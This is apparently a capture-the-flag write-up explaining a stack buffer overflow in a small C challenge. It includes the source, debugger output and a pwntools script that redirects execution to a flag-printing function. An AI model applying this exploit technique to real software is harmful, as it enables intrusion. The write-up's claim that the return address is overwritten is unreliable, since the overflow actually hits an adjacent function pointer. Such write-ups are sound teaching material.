> In this write i will explain how overflow a binary and overwrite the return value with an address of our choice. i this case we will point the execution our the win function that gives us the flag. MAYBE: to do this locally you can get the chall [here](/assets/img/Posts/ret2win/chall) with its source code [here](/assets/img/Posts/ret2win/chall.c). NO decompilation pressure
{: .prompt-tip }

## lets get started
Well, we have the source, we can first take a look at it before we get to the binary

We have three functions `main`, `welcome_message` and `win`. All we need is have `win` function being executed. Unlucky for us, our lovely function is not called in the `main` function. not entirely unlucky though.

In buffer overflow, we are mostly used to seeing the `gets` as the function handling our input, in this case we have `scanf`. It took me a while before i could really understand how this code can be vulnerable. Then i saw that the `scanf` function is taking all our input to the `buff` variable which only stores `2 bytes` (one character only) letting the rest overwrite the values in the stack. sweeeet!!
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>

// all the best !! :)
void win(){
	char flag[100];
	const int fd = open("./flag.txt", O_RDONLY);

	if (fd < 0){
		fprintf(stdout, "if this happens on the server, talk to admin, else create a flag.txt file :)");
		fflush(stdout);
	}

	read(fd, flag, sizeof(flag));
	fprintf(stdout, "%s \n", flag);
	fflush(stdout);
}

void welcome_message(){
	fprintf(stdout, "Welcome to the Madness Comrade !\n");
	fflush(stdout);
}

int main(int argc, char **argv){
	void (*f)() = welcome_message;
	char buff[2];
	printf("Do you have anything to say? (y\\n): ");
	fflush(stdout);
	scanf("%s", buff);
	f();
	return 0;
}
```
Checking on the file, we find it is of 64 bit architecture, it is dynamically linked and not stripped which would have helped us very much if we did not have its source file.
```bash
┌──(kali㉿prosec)-[~/hacks/kca/pwn/ret2win]
└─$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c88907f681c0259d1ead3c61498b872418d33529, for GNU/Linux 3.2.0, not stripped
```
Let us now check the security of the binary. There is no `canaries` and `No PIE` which means we can overflow without being caught and the address of the `win` function does not change. Thats all we needed, isn't.
```bash
┌──(kali㉿prosec)-[~/hacks/kca/pwn/ret2win]
└─$ checksec --file chall

    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

To test my logic, went on and fired up `gdb` in my machine. And guess what, setting a break pointer right before the function returns, and reading the values in the rip register, i found it filled with my `aaaaaa`.

```bash
(gdb) b *main+92
Breakpoint 1 at 0x4012c1
(gdb) r

```
We know the offset is `2` from the size of the `buff` variable
```c
char buff[2];
```

Now, what do we need to complete our payload? well, remember the goal is to overwrite the return address which the win function's address. So let us go on and look for the `win address` using `gdb`. There it is
```bash
(gdb) p *win
$1 = {<text variable, no debug info>} 0x401186 <win>
(gdb) 
```

### python script to automate the exploitation
With all that information, let us craft a python script that will do everything for us.
```python
#!/usr/bin/env python3
#author: pr0rat

from pwn import *

exe = './chall'
def start(argv=[], *a, **kw):
        if args.REMOTE:
                return remote(sys.argv[1], sys.argv[2], *a, **kw)
        elif args.LOCAL:
                return process([exe] + argv, *a, **kw)
        else:
                print("Usage: ./exploit.py REMOTE <server> <port>")
                print(" OR ./exploit.py LOCAL")
                exit()

p= start()

#because our binary is 64 bit, we user p64 function in pwntools which represents it in 
#little endian format as well as tell the program that it is of a 64 bit architecture
win_addr = p64(0x401186)

payload = b''
payload += b'nn'
payload += win_addr

p.recvuntil(b"): ")
p.sendline(payload)
print(p.recv())
```

Hooray!! with this script, you exploit the buffer overflow, overwrite the return address with the win function address which will give you the flag.

Running it locally 
> NB: It requires you to create a dummy flag.txt for testing.

```bash

and in the remote server its just putting the IP and the port as shown from the usage message.
